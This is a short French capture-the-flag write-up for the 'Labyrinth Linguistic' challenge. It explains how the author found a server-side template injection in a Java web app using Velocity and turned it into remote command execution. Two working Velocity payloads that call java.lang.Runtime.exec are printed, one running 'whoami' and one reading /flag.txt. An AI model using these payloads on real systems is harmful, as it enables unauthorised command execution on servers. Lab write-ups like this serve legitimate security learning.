# Labyrinth Linguistic - Nerumir

> Nous nous rendons sur une page web et explorons... Il y a un petit formulaire, je l'ai testé et j'ai trouvé une XSS mais rien d'autre. Nous avons également le code source (`backend`) en fichiers annexes.

- J'ai téléchargé les fichiers du challenge et j'ai lu le code, c'est un serveur web `java`. En lisant le code j'ai découvert `Velocity`. Et j'ai trouvé une faille d'injection de template. Donc code possiblement executable côté serveur donc `RCE`.

- J'ai essayé de voir sur internet les différentes choses possibles, rien ne semblait fonctionner car on avait que la variable `name`.. J'ai trouvé qu'on peut se servir de cette variable pour remonter via des méthodes `java` sur les classes de `java`. J'ai donc pu faire la `RCE`, d'abord pour trouver le flag et ensuite pour afficher son contenu... C'était facile de trouver son emplacement car il est indiqué dans le `Dockerfile` téléchargé.

`Payload` trouvé sur internet : 

```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

`Payload` adapté et fonctionnel (assez fastidieux, il a fallu y aller à tâtons et essayer des choses..) :

```
#set($str=$name.getClass().forName("java.lang.String"))
#set($chr=$name.getClass().forName("java.lang.Character"))
#set($ex=$name.getClass().forName("java.lang.Runtime").getRuntime().exec("cat /flag.txt"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

J'ai supprimé les retours à la ligne entre chaque caractère via les commandes vim et j'ai submit le flag obtenu.
